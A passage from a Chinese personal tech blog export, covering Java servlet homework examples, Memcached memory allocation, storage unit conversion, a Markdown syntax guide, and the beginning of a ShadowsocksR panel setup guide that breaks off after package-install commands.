class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#HttpServlet()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Servlet_2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">// super.doGet(req, resp);</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">resp.setHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;text/html;charset=UTF-8&quot;</span>);  </span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">out.println(<span class="string">&quot;&lt;html&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;head&gt;&lt;title&gt;表单提交&lt;/title&gt;&lt;/head&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;body&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;h1&gt;表单提交页面&lt;/h1&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;form action=&#x27;Servlet_2&#x27; method=&#x27;post&#x27;&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;姓名：&lt;input type=&#x27;text&#x27; name=&#x27;name&#x27; /&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;邮箱：&lt;input type=&#x27;mail&#x27; name=&#x27;mail&#x27; /&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;提交&#x27;&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;/form&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;/body&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;&lt;/html&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">// super.doPost(req, resp);</span></span><br><span class="line">req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">resp.setHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;text/html;charset=UTF-8&quot;</span>);  </span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">mail</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;mail&quot;</span>);</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">out.println(<span class="string">&quot;提交的姓名为：&quot;</span>+name+<span class="string">&quot;&lt;br /&gt;&quot;</span>);</span><br><span class="line">out.println(<span class="string">&quot;提交的邮箱为：&quot;</span>+mail+<span class="string">&quot;&lt;br /&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行图示如下：</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa9euf82olj308e04o3yf.jpg" alt="Form Page"><br><img src="https://cdn.bugwz.com/006qpCDTjw1fa9eufmacjj308q03njr8.jpg" alt="Form Submit"></p><blockquote><p><a id="3-3"></a>作业 3：<a href="#3">点此查看要求</a></p></blockquote><p>  具体答案内容，请查看<a href="https://bugwz.com/jsp_2/#jsp_2_lifecycle">这里</a></p><blockquote><p><a id="4-4"></a>作业 4：<a href="#4">点此查看要求</a></p></blockquote><p>Servlet有三种实现方式：</p><ul><li>继承原生Servlet接口</li><li>继承GenericServlet类</li><li>继承HttpServlet类</li></ul><h1 id="Servlet的这三种实现方式的具体讲解如下："><a href="#Servlet的这三种实现方式的具体讲解如下：" class="headerlink" title="Servlet的这三种实现方式的具体讲解如下："></a>Servlet的这三种实现方式的具体讲解如下：</h1><h2 id="1-继承原生Servlet接口："><a href="#1-继承原生Servlet接口：" class="headerlink" title="1.继承原生Servlet接口："></a>1.继承原生Servlet接口：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/Servlet_1_1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Servlet_1_1</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        System.out.println(<span class="string">&quot;destroy....&quot;</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//该 函数用于初始化，只会被调用一次（当用户第一次访问Servlet时，被调用）  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig arg0)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;init....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//用于处理业务逻辑，应该把业务逻辑代码写在该方法中  </span></span><br><span class="line">    <span class="comment">//会被多次调用，当用户每访问一次时就会被调用一次  </span></span><br><span class="line">    <span class="comment">//request用于获取客户端的信息  </span></span><br><span class="line">    <span class="comment">//response用户向客户端返回信息  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest request, ServletResponse response)</span>  </span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;service....&quot;</span>);       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注解："><a href="#注解：" class="headerlink" title="注解："></a>注解：</h3><p>这种实现方法是新建一个类，该类继承了Servlet接口，因为新建类的缘故，我们需要手动添加<code>@WebServlet(&quot;/Servlet_1_1&quot;)</code>代码，然后重写Servlet接口的五个方法。</p><h4 id="题外话：Servlet接口的五个方法"><a href="#题外话：Servlet接口的五个方法" class="headerlink" title="题外话：Servlet接口的五个方法"></a>题外话：Servlet接口的五个方法</h4><ol><li>init()</li><li>service()</li><li>destroy()</li><li>getServletConfig()</li><li>getServletInfo()</li></ol><h3 id="init-方法："><a href="#init-方法：" class="headerlink" title="init()方法："></a>init()方法：</h3><p>在Servlet实例化后，Servlet容器会调用init()方法来初始化该对象，主要是为了让Servlet对象在处理客户请求前可以完成一些初始化工作，例如：建立数据库的连接，获取配置信息等。对于每一个Servlet实例，init()方法只能被调用一次。init()方法有一个类型为ServletConfig的参数，Servlet容器通过这个参数向Servlet传递配置信息。Servlet使用ServletConfig对象从Web应用程序的配置信息中获取以名-值对形式提供的初始化参数。另外，在Servlet中，还可以通过ServletConfig对象获取描述Servlet运行环境的ServletContext对象，使用该对象，Servlet可以和它的Servlet容器进行通信。</p><h3 id="Service-方法："><a href="#Service-方法：" class="headerlink" title="Service()方法："></a>Service()方法：</h3><p>容器调用service()方法来处理客户端的请求。要注意的是，在service()方法被容器调用之前，必须确保init()方法正确完成。容器会构造一个表示客户端请求信息的请求对象（类型为ServletRequest）和一个用于对客户端进行响应的响应对象（类型为ServletResponse）作为参数传递给service()。在service()方法中，Servlet对象通过ServletRequest对象得到客户端的相关信息和请求信息，在对请求进行处理后，调用ServletResponse对象的方法设置响应信息。</p><h3 id="destroy-方法："><a href="#destroy-方法：" class="headerlink" title="destroy()方法："></a>destroy()方法：</h3><p>当容器检测到一个Servlet对象应该从服务中被移除的时候，容器会调用该对象的destroy()方法，以便让Servlet对象可以释放它所使用的资源，保存数据到持久存储设备中，例如将内存中的数据保存到数据库中，关闭数据库的连接等。当需要释放内存或者容器关闭时，容器就会调用Servlet对象的destroy()方法，在Servlet容器调用destroy()方法前，如果还有其他的线程正在service()方法中执行容器会等待这些线程执行完毕或者等待服务器设定的超时值到达。一旦Servlet对象的destroy()方法被调用，容器不回再把请求发送给该对象。如果需要改Servlet再次为客户端服务，容器将会重新产生一个Servlet对象来处理客户端的请求。在destroy()方法调用之后，容器会释放这个Servlet对象，在随后的时间内，该对象会被java的垃圾收集器所回收。</p><h3 id="getServletConfig-方法："><a href="#getServletConfig-方法：" class="headerlink" title="getServletConfig()方法："></a>getServletConfig()方法：</h3><p>该方法返回容器调用init()方法时传递给Servlet对象的ServletConfig对象，ServletConfig对象包含了Servlet的初始化参数。</p><h3 id="getServletInfo-方法："><a href="#getServletInfo-方法：" class="headerlink" title="getServletInfo()方法："></a>getServletInfo()方法：</h3><p>返回一个String类型的字符串，其中包括了关于Servlet的信息，例如，作者、版本和版权。该方法返回的应该是纯文本字符串，而不是任何类型的标记。</p><p>关于Servlet接口的五个方法的精彩文字转载自<a href="http://www.cnblogs.com/freeabyss/archive/2013/07/11/3187047.html">这里</a>。</p><h2 id="2-继承GenericServlet类："><a href="#2-继承GenericServlet类：" class="headerlink" title="2.继承GenericServlet类："></a>2.继承GenericServlet类：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/Servlet_1_2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Servlet_1_2</span> <span class="keyword">extends</span> <span class="title class_">GenericServlet</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写service方法即可</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest arg0, ServletResponse arg1)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">// TODO 自动生成的方法存根</span></span><br><span class="line"><span class="keyword">try</span>&#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;service....&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注解：-1"><a href="#注解：-1" class="headerlink" title="注解："></a>注解：</h3><p>这里的实现方法也是新建一个类，手动添加<code>@WebServlet(&quot;/Servlet_1_2&quot;)</code>这一行代码，然后只重写service()方法即可，如果我们直接通过实现Servlet接口来编写一个Servlet类，就需要实现Servlet接口中定义的5种方法，为了简化Servlet的编写，在javax.servlet包中，给我们提供了一个抽象的类GenericServlet，它提供了除service()方法外的其他4种方法的简单实现。GenericServlet类定义了一个通用的，不依赖具体协议的Servlet。实践出现的一个有意思的事情是，我进入映射的虚拟路径&#x2F;Servlet_1_2后，发现控制台输出的信息如下，这里我并没有修改init()方法:</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa9wwqs4wqj30ld0a9wfk.jpg" alt="控制台"></p><h2 id="2-继承HttpServlet类："><a href="#2-继承HttpServlet类：" class="headerlink" title="2.继承HttpServlet类："></a>2.继承HttpServlet类：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/Servlet_1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Servlet_1</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest arg0, HttpServletResponse arg1)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">// TODO 自动生成的方法存根</span></span><br><span class="line"><span class="comment">// super.service(arg0, arg1);</span></span><br><span class="line">System.out.println(<span class="string">&quot;service....&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// TODO 自动生成的方法存根</span></span><br><span class="line"><span class="comment">// super.destroy();</span></span><br><span class="line">System.out.println(<span class="string">&quot;destroy....&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"><span class="comment">// TODO 自动生成的方法存根</span></span><br><span class="line"><span class="comment">// super.init();</span></span><br><span class="line">System.out.println(<span class="string">&quot;init.....&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注解：-2"><a href="#注解：-2" class="headerlink" title="注解："></a>注解：</h3><p>新建一个Servlet类时的默认构建方法，也是最常用的构建方法。由于大多数网络应用中，都是浏览器通过HTTP协议去访问服务器资源，而我们编写的Servlet也主要是应用于HTTP协议的请求和响应，为了快速开发应用于HTTP协议的Servlet，在javax.servlet.http包中给我们提供了一个抽象的类HttpServlet，他继承自GenericServlet类，用于创建适合Web站点的HTTP Servlet。</p><blockquote><p><a id="5-5"></a>作业 5：<a href="#5">点此查看要求</a></p></blockquote><p>配置Serlvet的过程可分为两种，一种是Servlet3.0版本之前的配置，相对来说比较麻烦，还有一种是Servlet3.0版本之后的配置，相对来说简单很多，具体的配置方法，我在<a href="https://bugwz.com/jsp_1/">JSP笔记_1_初次使用Servlet</a>中已经详细说明过了，这里就不做具体说明了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
            <tag> JSP </tag>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Memcached的内存分配机制</title>
      <link href="/2016/10/02/memcached-memory-layout/"/>
      <url>/2016/10/02/memcached-memory-layout/</url>
      
        <content type="html"><![CDATA[<h2 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h2><ul><li><p><code>Slab Class</code>：由相同大小的Chunk组成，不同的Slab Class中的Chunk大小不同；</p></li><li><p><code>Page</code>：分配给单个Slab的内存大小，默认为1MB，分配给Slab之后依据Slab的大小拆分为Chunk；</p></li><li><p><code>Chunk</code>：将每一个Slab按照不同大小进行拆分，得到了不同大小的Chunk（每个Slab中的Chunk大小一致），Chunk的初始大小可以指定，并且可以根据不同的业务场景通过调整增长因子（factor：默认为1.25）进行调优；</p></li></ul><p><img src="https://cdn.bugwz.com/memcached-slab-alloction.png" alt="Slab Alloction 构造图 "></p><h2 id="二、存储过程"><a href="#二、存储过程" class="headerlink" title="二、存储过程"></a>二、存储过程</h2><p>Memcached根据收到数据的大小，选择最合适数据大小的Slab Class，根据Memcached中保存的该Slab Class中空闲的Chunk列表，将将数据存储于其中。</p><h2 id="三、相关链接"><a href="#三、相关链接" class="headerlink" title="三、相关链接"></a>三、相关链接</h2><ul><li>[The Slab Allocator: An Object-Caching Kernel Memory Allocator](</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Memcached </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GiB与GB等单位的转换问题</title>
      <link href="/2016/03/01/unit-conversion/"/>
      <url>/2016/03/01/unit-conversion/</url>
      
        <content type="html"><![CDATA[<h2 id="一、两个标准"><a href="#一、两个标准" class="headerlink" title="一、两个标准"></a>一、两个标准</h2><ul><li><p><code>十进制标准</code>：由国际单位制（<code>SI</code>）指定；</p><blockquote><p>1999年，国际电工委员会（IEC）公布了修正2：”IEC 60027-2：电工技术应用的字母符号 — 第二部分：通信和电子。”，这个标准，在1998年通过，介绍了词头”kibi-<br>“、”mebi-“、”gibi-“、”tebi-“、”pebi-“、”exbi-“，作为二进制乘幂的计数方法。</p></blockquote></li><li><p><code>二进制标准</code>：由国际电工委员会（<code>IEC</code>）指定；</p></li></ul><p><strong>十进制标准单位换算</strong>（其中<code>KB</code>是<code>kilobyte</code>的缩写，指的是<code>千字节</code>）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1KB = 1000Byte</span><br><span class="line">1MB = 1000KB</span><br><span class="line">1GB = 1000MB</span><br><span class="line">1TB = 1000GB</span><br></pre></td></tr></table></figure><p><strong>二进制标准单位换算</strong>（其中<code>KiB</code>是<code>kilo binary byte</code>的缩写，指的是<code>千位二进制字节</code>）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1KiB = 1024Byte</span><br><span class="line">1MiB = 1024KiB</span><br><span class="line">1GiB = 1024MiB</span><br><span class="line">1TiB = 1024GiB</span><br></pre></td></tr></table></figure><h2 id="二、磁盘容量问题"><a href="#二、磁盘容量问题" class="headerlink" title="二、磁盘容量问题"></a>二、磁盘容量问题</h2><ul><li>硬盘制造商使用<code>十进制标准</code>；</li><li>电脑软件使用<code>二进制标准</code>；</li></ul><h2 id="三、大B与小b"><a href="#三、大B与小b" class="headerlink" title="三、大B与小b"></a>三、大B与小b</h2><p>因为在网络传输的时候，我们传输的实际上是一个个二进制数，可以俗称为<code>比特流</code>，传输二进制数的时候不需要管这是什么字，使用的什么编码，我只管自己传输了多少二进制位，因此在网络中，我们普遍使用小b作为网络传输单位。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Hardware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown语法大全</title>
      <link href="/2016/02/28/markdown/"/>
      <url>/2016/02/28/markdown/</url>
      
        <content type="html"><![CDATA[<h2 id="一、欢迎使用Markdown"><a href="#一、欢迎使用Markdown" class="headerlink" title="一、欢迎使用Markdown"></a>一、欢迎使用Markdown</h2><p>@(示例笔记本)[Markdown|帮助|Markdown]</p><ul><li><strong>功能丰富</strong> ：支持高亮代码块、<em>LaTeX</em> 公式、流程图，本地图片以及附件上传，甚至截图粘贴，工作学习好帮手；</li><li><strong>得心应手</strong> ：简洁高效的编辑器，提供[桌面客户端][1]以及[离线Chrome App][2]，支持移动端 Web；</li><li><strong>深度整合</strong> ：支持选择笔记本和添加标签，支持从印象笔记跳转编辑，轻松管理。</li></ul><h2 id="二、Markdown简介"><a href="#二、Markdown简介" class="headerlink" title="二、Markdown简介"></a>二、Markdown简介</h2><blockquote><p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成格式丰富的HTML页面。    —— <a href="https://zh.wikipedia.org/wiki/Markdown">维基百科</a></p></blockquote><p>正如您在阅读的这份文档，它使用简单的符号标识不同的标题，将某些文字标记为<strong>粗体</strong>或者<em>斜体</em>，创建一个<a href="http://www.example.com/">链接</a>或一个脚注[^demo]。下面列举了几个高级功能，更多语法请按<code>Ctrl + /</code>查看帮助。 </p><h3 id="2-1、代码块"><a href="#2-1、代码块" class="headerlink" title="2.1、代码块"></a>2.1、代码块</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@requires_authorization</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">somefunc</span>(<span class="params">param1=<span class="string">&#x27;&#x27;</span>, param2=<span class="number">0</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;A docstring&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> param1 &gt; param2: <span class="comment"># interesting</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Greater&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> (param2 - param1 + <span class="number">1</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SomeClass</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>message = <span class="string">&#x27;&#x27;&#x27;interpreter</span></span><br><span class="line"><span class="string"><span class="meta">... </span>prompt&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="2-2、LaTeX-公式"><a href="#2-2、LaTeX-公式" class="headerlink" title="2.2、LaTeX 公式"></a>2.2、LaTeX 公式</h3><p>可以创建行内公式，例如 $\Gamma(n) &#x3D; (n-1)!\quad\forall n\in\mathbb N$。或者块级公式：</p><p>$$x &#x3D; \dfrac{-b \pm \sqrt{b^2 - 4ac}}{2a} $$</p><h3 id="2-3、表格"><a href="#2-3、表格" class="headerlink" title="2.3、表格"></a>2.3、表格</h3><table><thead><tr><th align="left">Item</th><th align="right">Value</th><th align="center">Qty</th></tr></thead><tbody><tr><td align="left">Computer</td><td align="right">1600 USD</td><td align="center">5</td></tr><tr><td align="left">Phone</td><td align="right">12 USD</td><td align="center">12</td></tr><tr><td align="left">Pipe</td><td align="right">1 USD</td><td align="center">234</td></tr></tbody></table><h3 id="2-4、流程图"><a href="#2-4、流程图" class="headerlink" title="2.4、流程图"></a>2.4、流程图</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">st=&gt;start: Start</span><br><span class="line">e=&gt;end</span><br><span class="line">op=&gt;operation: My Operation</span><br><span class="line">cond=&gt;condition: Yes or No?</span><br><span class="line"></span><br><span class="line">st-&gt;op-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op</span><br></pre></td></tr></table></figure><p>以及时序图:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alice-&gt;Bob: Hello Bob, how are you?</span><br><span class="line">Note right of Bob: Bob thinks</span><br><span class="line">Bob--&gt;Alice: I am good thanks!</span><br></pre></td></tr></table></figure><blockquote><p><strong>提示：</strong>想了解更多，请查看<strong>流程图</strong>[语法][3]以及<strong>时序图</strong>[语法][4]。</p></blockquote><h3 id="2-5、复选框"><a href="#2-5、复选框" class="headerlink" title="2.5、复选框"></a>2.5、复选框</h3><p>使用 <code>- [ ]</code> 和 <code>- [x]</code> 语法可以创建复选框，实现 todo-list 等功能。例如：</p><ul><li><input checked="" disabled="" type="checkbox"> 已完成事项</li><li><input disabled="" type="checkbox"> 待办事项1</li><li><input disabled="" type="checkbox"> 待办事项2</li></ul><blockquote><p><strong>注意：</strong>目前支持尚不完全，在印象笔记中勾选复选框是无效、不能同步的，修改 Markdown 原文才可生效。</p></blockquote><h2 id="三、印象笔记相关"><a href="#三、印象笔记相关" class="headerlink" title="三、印象笔记相关"></a>三、印象笔记相关</h2><h3 id="3-1、笔记本和标签"><a href="#3-1、笔记本和标签" class="headerlink" title="3.1、笔记本和标签"></a>3.1、笔记本和标签</h3><p><strong>增加</strong>了<code>@(笔记本)[标签A|标签B]</code>语法, 以选择笔记本和添加标签。 <strong>绑定账号后</strong>， 输入<code>(</code>自动会出现笔记本列表，请从中选择。</p><h3 id="3-2、笔记标题"><a href="#3-2、笔记标题" class="headerlink" title="3.2、笔记标题"></a>3.2、笔记标题</h3><p>会自动使用文档内出现的<strong>第一个标题</strong>作为笔记标题。例如本文，就是第一行的 <code>欢迎使用</code>。</p><h3 id="3-3、快捷编辑"><a href="#3-3、快捷编辑" class="headerlink" title="3.3、快捷编辑"></a>3.3、快捷编辑</h3><p>保存在印象笔记中的笔记，右上角会有一个红色的编辑按钮，点击后会回到中打开并编辑该笔记。</p><blockquote><p><strong>注意：</strong>目前用户在印象笔记中单方面做的任何修改。</p></blockquote><h3 id="3-4、数据同步"><a href="#3-4、数据同步" class="headerlink" title="3.4、数据同步"></a>3.4、数据同步</h3><p>通过<strong>将Markdown原文以隐藏内容保存在笔记中</strong>的精妙设计，实现了对Markdown的存储和再次编辑。既解决了其他产品只是单向导出HTML的单薄，又规避了服务端存储Markdown带来的隐私安全问题。这样，服务端仅作为对印象笔记 API调用和数据转换之用。</p><blockquote><p>**隐私声明：用户所有的笔记数据，均保存在印象笔记中。</p></blockquote><h3 id="3-5、离线存储"><a href="#3-5、离线存储" class="headerlink" title="3.5、离线存储"></a>3.5、离线存储</h3><p>使用浏览器离线存储将内容实时保存在本地，不必担心网络断掉或浏览器崩溃。为了节省空间和避免冲突，已同步至印象笔记并且不再修改的笔记将删除部分本地缓存，不过依然可以随时通过<code>文档管理</code>打开。</p><blockquote><p><strong>注意：</strong>虽然浏览器存储大部分时候都比较可靠，但印象笔记作为专业云存储，更值得信赖。以防万一，<strong>请务必经常及时同步到印象笔记</strong>。</p></blockquote><h2 id="四、编辑器相关"><a href="#四、编辑器相关" class="headerlink" title="四、编辑器相关"></a>四、编辑器相关</h2><h3 id="4-1、设置"><a href="#4-1、设置" class="headerlink" title="4.1、设置"></a>4.1、设置</h3><p>右侧系统菜单（快捷键<code>Ctrl + M</code>）的<code>设置</code>中，提供了界面字体、字号、自定义CSS、vim&#x2F;emacs 键盘模式等高级选项。</p><h3 id="4-1、快捷键"><a href="#4-1、快捷键" class="headerlink" title="4.1、快捷键"></a>4.1、快捷键</h3><p>帮助    <code>Ctrl + /</code><br>同步文档    <code>Ctrl + S</code><br>创建文档    <code>Ctrl + Alt + N</code><br>最大化编辑器    <code>Ctrl + Enter</code><br>预览文档 <code>Ctrl + Alt + Enter</code><br>文档管理    <code>Ctrl + O</code><br>系统菜单    <code>Ctrl + M</code> </p><p>加粗    <code>Ctrl + B</code><br>插入图片    <code>Ctrl + G</code><br>插入链接    <code>Ctrl + L</code><br>提升标题    <code>Ctrl + H</code></p><p>本文转载自<a href="https://maxiang.io/">https://maxiang.io/</a>.</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于SS-Panel V2的SS面板式管理系统</title>
      <link href="/2016/02/01/ss-panel-v2/"/>
      <url>/2016/02/01/ss-panel-v2/</url>
      
        <content type="html"><![CDATA[<h2 id="一、说明"><a href="#一、说明" class="headerlink" title="一、说明"></a>一、说明</h2><p>本人之前接触过Shadowsocks这个软件，感觉其实是挺好用的，因为这款软件最初的着力点是便捷的连接，通信的速度，所以使用起来的感受相比之前使用的VPN还是好了太多太多。如果是针对于像我一样有些固执的人来说，我是绝对会为了个人的方便以及使用的稳定性而购置一台服务器并进行搭建Shadowsocks服务器的，但是针对于那些Shadowsocks服务商来说，租赁出去的服务器的限制条件无非是使用时间以及使用流量。因此，针对于限制流量这一方面的话，Shadowsocks自身就无法做到了，这也是本文的初衷，可视化的界面管理工具的出现以及流量监控等功能的出现也会减少维护的繁琐程度，OK，进入正文。</p><p>注：这里所说的前端与后端是指用户看到的部分以及用户看不到的部分，看到的部分就是SS-Panel V2的界面(即前端)，看不到的部分就是运行在后面的Shadowsocks等部分(即后端)。</p><h2 id="二、正文"><a href="#二、正文" class="headerlink" title="二、正文"></a>二、正文</h2><blockquote><h2 id="1-ShadowsocksR多用户版服务端安装教程-后端"><a href="#1-ShadowsocksR多用户版服务端安装教程-后端" class="headerlink" title="1. ShadowsocksR多用户版服务端安装教程(后端)"></a>1. ShadowsocksR多用户版服务端安装教程(后端)</h2></blockquote><h3 id="2-1、-安装基本库："><a href="#2-1、-安装基本库：" class="headerlink" title="2.1、 安装基本库："></a>2.1、 安装基本库：</h3><ol><li><p>CentOS系统:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install python-setuptools</span><br><span class="line">easy_install pip</span><br><span class="line">yum install git</span><br></pre></td></tr></table></figure></li><li><p>Ubuntu&#x2F;Debian系统(推荐)：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python-pip git -y</span><br></pre></td></tr></table></figure></li></ol><p>注：如果要使用 salsa20 和 chacha20 算法，请安装 <a href="https://github.com/jedisct1/libsodium">libsodium</a>，最新版本请点击<a href="https://github.com/jedisct1/libsodium/releases">这里</a>。</p><h3 id="2-2、安装cymysql"><a href="#2-2、安装cymysql" class="headerlink" title="2.2、安装cymysql"></a>2.2、安装cymysql</h3><figure class="highlight bash"><table><tr><td 